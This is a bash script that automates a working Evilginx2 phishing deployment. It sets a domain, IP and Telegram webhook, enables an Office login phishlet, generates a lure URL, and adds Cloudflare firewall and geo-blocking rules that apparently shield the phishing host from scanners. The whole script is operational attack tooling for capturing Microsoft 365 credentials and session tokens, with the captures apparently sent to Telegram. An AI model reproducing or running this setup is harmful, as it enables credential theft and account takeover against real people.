#!/usr/bin/env bash

# Check if jq is installed, and install it if missing
if ! command -v jq &> /dev/null; then
    echo "jq is not installed. Installing jq..."
    if [ -f /etc/debian_version ]; then
        sudo apt update && sudo apt install jq -y
    elif [ -f /etc/redhat-release ]; then
        sudo yum install jq -y
    elif [ -f /etc/fedora-release ]; then
        sudo dnf install jq -y
    elif [ -f /etc/alpine-release ]; then
        sudo apk add jq
    elif [ "$(uname)" == "Darwin" ]; then
        if command -v brew &> /dev/null; then
            brew install jq
        else
            echo "Homebrew is not installed. Please install jq manually."
            exit 1
        fi
    else
        echo "Unsupported operating system. Please install jq manually."
        exit 1
    fi
fi

LOG_FILE="/var/log/evilginx_auto.log"
CONFIG_FILE="/root/.evilginx/config.yaml"

# Function to log messages
log_message() {
    echo "[$(date)] $1" | tee -a "$LOG_FILE"
}

# Ensure required packages are installed
log_message "[+] Checking if required packages are installed..."
if ! command -v expect &> /dev/null; then
    log_message "[!] 'expect' not found. Installing..."
    sudo apt update && sudo apt install expect -y || { log_message "[!] Failed to install 'expect'!"; exit 1; }
else
    log_message "[+] 'expect' is already installed."
fi

if ! command -v tmux &> /dev/null; then
    log_message "[!] 'tmux' not found. Installing..."
    sudo apt update && sudo apt install tmux -y || { log_message "[!] Failed to install 'tmux'!"; exit 1; }
else
    log_message "[+] 'tmux' is already installed."
fi

# Use a flag to ensure we only spawn a tmux session once.
if [ -z "$TMUX" ] && [ -z "$TMUX_SPAWNED" ]; then
    log_message "[+] Not inside tmux. Spawning a new tmux session..."
    export TMUX_SPAWNED=1
    tmux new-session -d -s evilginx "/bin/bash $0"
    sleep 1
    tmux attach-session -t evilginx
    exit
fi

log_message "[+] Running inside tmux session: evilginx"

# Prompt for Evilginx variables
read -p "Enter Evilginx domain: " DOMAIN
read -p "Enter Evilginx external IPv4: " EXTERNAL_IPV4
read -p "Enter Evilginx redirect URL: " REDIRECT_URL
read -p "Enter Telegram Webhook: " TELEGRAM_WEBHOOK

# Prompt for Cloudflare variables
read -p "Enter Cloudflare API Token: " CF_API_TOKEN
read -p "Enter Cloudflare Zone ID: " CF_ZONE_ID

#############################
# Evilginx Automation Steps #
#############################

# First Evilginx Run - Start and Exit Immediately
log_message "[+] Starting Evilginx for the first time and exiting..."
expect <<EOF | tee -a "$LOG_FILE"
    spawn ./evilginx2
    expect "evilginx2 >"
    send "q\r"
    expect eof
EOF

# Allow Evilginx to fully exit before modifying config
sleep 5  

# Modify the Evilginx config file
if [ -f "$CONFIG_FILE" ]; then
    log_message "[+] Modifying Evilginx config.yaml..."
    
    # Fix dns_port issue
    sed -i 's/dns_port: [0-9]\+/dns_port: 5300/' "$CONFIG_FILE"
    
    # Update settings with user inputs
    sed -i "s|domain: .*|domain: \"$DOMAIN\"|" "$CONFIG_FILE"
    sed -i "s|external_ipv4: .*|external_ipv4: \"$EXTERNAL_IPV4\"|" "$CONFIG_FILE"
    sed -i '/unauth_url:/d' "$CONFIG_FILE"
    
    # Ensure webhook_telegram is correctly formatted
    if grep -q "webhook_telegram:" "$CONFIG_FILE"; then
        sed -i "s|webhook_telegram: .*|webhook_telegram: \"$TELEGRAM_WEBHOOK\"|" "$CONFIG_FILE"
    else
        sed -i "/general:/a \ \ webhook_telegram: \"$TELEGRAM_WEBHOOK\"" "$CONFIG_FILE"
    fi

    log_message "[+] Config file modified successfully!"
else
    log_message "[!] Config file not found! Exiting."
    exit 1
fi

# Replace blacklist.txt if available in /root/Evolcorp-MDR
if [ -f "/root/Evolcorp-MDR/blacklist.txt" ]; then
    log_message "[+] Replacing /root/.evilginx/blacklist.txt with /root/Evolcorp-MDR/blacklist.txt..."
    cp /root/Evolcorp-MDR/blacklist.txt /root/.evilginx/blacklist.txt || { log_message "[!] Failed to copy blacklist.txt"; exit 1; }
    log_message "[+] blacklist.txt replaced successfully."
else
    log_message "[!] /root/Evolcorp-MDR/blacklist.txt not found. Skipping replacement."
fi

# Validate YAML syntax before restarting Evilginx
yaml_check=$(python3 -c "import yaml; yaml.safe_load(open('$CONFIG_FILE'))" 2>&1)
if [ $? -ne 0 ]; then
    log_message "[!] YAML Validation Error: $yaml_check"
    exit 1
fi

# Second Evilginx Run - Execute Commands via expect
log_message "[+] Restarting Evilginx and executing commands..."
expect <<EOF | tee -a "$LOG_FILE"
    spawn ./evilginx2
    expect "evilginx2 >"
    send "phishlets hostname office $DOMAIN\r"
    expect "evilginx2 >"
    send "phishlets enable office\r"
    expect "evilginx2 >"
    send "lures create office\r"
    expect "evilginx2 >"
    send "lures edit 0 redirect_url $REDIRECT_URL\r"
    expect "evilginx2 >"
    send "lures get-url 0\r"
    expect "evilginx2 >"
    send "config\r"
    expect eof
EOF

#############################################
# Cloudflare API - Retrieve & Create Rules  #
#############################################

# Retrieve the RULESET_ID for "http_request_firewall_custom"
log_message "[+] Fetching RULESET_ID for http_request_firewall_custom..."
RULESET_ID=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/${CF_ZONE_ID}/rulesets?phase=http_request_firewall_custom" \
-H "Authorization: Bearer ${CF_API_TOKEN}" \
-H "Content-Type: application/json" | jq -r '.result[] | select(.phase=="http_request_firewall_custom" and .source=="firewall_custom") | .id')

if [ -z "$RULESET_ID" ]; then
    log_message "[!] Error: Could not retrieve RULESET_ID for http_request_firewall_custom."
    exit 1
fi
log_message "[+] RULESET_ID: ${RULESET_ID}"

# Retrieve the RATE_LIMIT_RULESET_ID for "http_ratelimit"
log_message "[+] Fetching RATE_LIMIT_RULESET_ID for http_ratelimit..."
RATE_LIMIT_RULESET_ID=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/${CF_ZONE_ID}/rulesets?phase=http_ratelimit" \
-H "Authorization: Bearer ${CF_API_TOKEN}" \
-H "Content-Type: application/json" | jq -r '.result[] | select(.phase=="http_ratelimit" and .source=="rate_limit") | .id')

if [ -z "$RATE_LIMIT_RULESET_ID" ]; then
    log_message "[!] Error: Could not retrieve RATE_LIMIT_RULESET_ID for http_ratelimit."
    exit 1
fi
log_message "[+] RATE_LIMIT_RULESET_ID: ${RATE_LIMIT_RULESET_ID}"

# Function to create a firewall rule using jq to format JSON
create_rule() {
    local description="$1"
    local action="$2"
    local expression="$3"
    local ruleset_id="$4"

    log_message "[+] Creating rule: ${description}..."

    curl -X POST "https://api.cloudflare.com/client/v4/zones/${CF_ZONE_ID}/rulesets/${ruleset_id}/rules" \
    -H "Authorization: Bearer ${CF_API_TOKEN}" \
    -H "Content-Type: application/json" \
    --data "$(jq -n \
        --arg desc "$description" \
        --arg act "$action" \
        --arg expr "$expression" \
        '{description: $desc, enabled: true, action: $act, expression: $expr}')"

    log_message "[+] Done creating rule: ${description}"
}

# Function to create a rate limiting rule using jq to format JSON
create_rate_limit_rule() {
    local description="$1"
    local expression="$2"

    log_message "[+] Creating rate limit rule: ${description}..."

    curl -X POST "https://api.cloudflare.com/client/v4/zones/${CF_ZONE_ID}/rulesets/${RATE_LIMIT_RULESET_ID}/rules" \
    -H "Authorization: Bearer ${CF_API_TOKEN}" \
    -H "Content-Type: application/json" \
    --data "$(jq -n \
        --arg desc "$description" \
        --arg expr "$expression" \
        '{
            description: $desc,
            expression: $expr,
            action: "block",
            ratelimit: {
                characteristics: ["cf.colo.id", "ip.src"],
                period: 10,
                requests_per_period: 10,
                mitigation_timeout: 10
            }
        }')"

    log_message "[+] Done creating rate limit rule: ${description}"
}

# Creating Cloudflare security rules
create_rule "Challenge high threat score visitors" "managed_challenge" "(cf.threat_score gt 40)" "$RULESET_ID"

create_rule "Block common WordPress attack vectors" "block" "(http.request.uri eq \"/xmlrpc.php\") or (http.request.uri contains \"/wp-admin\") or (http.request.uri contains \"/wp-config\") or (http.request.uri contains \"install.php\")" "$RULESET_ID"

create_rule "Block /wp-admin for non-allowed countries" "block" "(http.request.uri contains \"wp-admin\") and not (ip.src.country in {\"CA\" \"GB\" \"US\" \"MX\"})" "$RULESET_ID"

create_rule "Block traffic outside North America & Europe" "block" "not (ip.src.continent in {\"NA\" \"EU\"})" "$RULESET_ID"

create_rule "Challenge HTTP/1.0 requests" "managed_challenge" "(http.request.version eq \"HTTP/1.0\")" "$RULESET_ID"

# Creating Cloudflare rate limiting rule
create_rate_limit_rule "Rate limit PHP requests unless from search engine crawlers" "(http.request.uri.path contains \"php\") or (cf.verified_bot_category ne \"Search Engine Crawler\")"

log_message "[+] All Cloudflare rules created successfully!"

###############################
# Final Step: Start Evilginx  #
###############################
log_message "[+] Starting Evilginx manually..."
./evilginx2
